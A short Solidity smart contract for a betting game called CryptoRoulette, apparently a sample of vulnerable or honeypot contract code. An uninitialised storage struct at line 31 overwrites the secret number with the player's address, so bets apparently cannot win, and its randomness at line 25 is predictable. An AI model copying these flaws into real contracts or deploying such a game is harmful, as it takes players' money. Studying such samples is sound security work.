1 pragma solidity ^0.4.24;
2 
3 // To play, call the play() method with the guessed number.  Bet price: 0.1 ether
4 
5 contract CryptoRoulette {
6 
7     uint256 public secretNumber;
8     uint256 public lastPlayed;
9     uint256 public betPrice = 0.1 ether;
10     address public ownerAddr;
11 
12     struct Game {
13         address player;
14         uint256 number;
15     }
16     Game[] public gamesPlayed;
17 
18     function CryptoRoulette() public {
19         ownerAddr = msg.sender;
20         generateNewRandom();
21     }
22 
23     function generateNewRandom() internal {
24         // initialize secretNumber with a value between 0 and 15
25         secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 16;
26     }
27 
28     function play(uint256 number) payable public {
29         require(msg.value >= betPrice && number < 16);
30 
31         Game game;
32         game.player = msg.sender;
33         game.number = number;
34         gamesPlayed.push(game);
35 
36         if (number == secretNumber) {
37             // win!
38             if(msg.value*15>this.balance){
39                 msg.sender.transfer(this.balance);
40             }
41             else{
42                 msg.sender.transfer(msg.value*15);
43             }
44         }
45 
46         generateNewRandom();
47         lastPlayed = now;
48     }
49 
50     function kill() public {
51         if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
52             suicide(msg.sender);
53         }
54     }
55 
56     function() public payable { }
57 }